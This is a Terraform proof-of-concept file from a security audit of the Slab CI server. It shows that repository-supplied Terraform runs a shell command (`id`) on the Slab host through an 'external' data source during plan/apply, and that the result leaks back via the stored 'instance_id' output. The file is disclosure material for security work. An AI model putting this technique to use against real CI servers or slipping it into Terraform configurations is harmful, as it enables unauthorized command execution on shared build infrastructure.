# PoC for the Slab security audit (finding F1): repo-supplied Terraform runs as
# the Slab server process itself, not on the spawned instance. This script
# creates no cloud resource; it executes `id` on the Slab host during
# `terraform plan`/`apply` and returns the result through the `instance_id`
# output that the Slab server stores and exposes (finding F2).
terraform {
  required_version = "~> 1.14"

  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "~> 2.3"
    }
  }
}

# Variables always passed by the Slab server when it invokes Terraform
# (see InputVariables in slab's src/lib/backends/terraform.rs).
variable "instance_type" {
  type        = string
  description = "Instance type selected in ci/slab.toml (unused by this PoC)"
}

variable "instance_label" {
  type        = string
  description = "Instance label generated by the Slab server (unused by this PoC)"
}

variable "user_data" {
  type        = string
  description = "Cloud-init script of the runner that would normally be spawned (unused by this PoC)"
}

# Runs `id` on the Slab server and captures its output. The `external` data
# source is evaluated during `terraform plan`, i.e. before any resource is
# applied, so the command runs on the Slab host in both plan and apply passes.
data "external" "slab_id" {
  program = ["sh", "-c", "printf '{\"result\": \"%s\"}' \"$(id)\""]
}

output "instance_id" {
  value       = data.external.slab_id.result.result
  description = "Output of `id` executed on the Slab server (F1 PoC)"
}
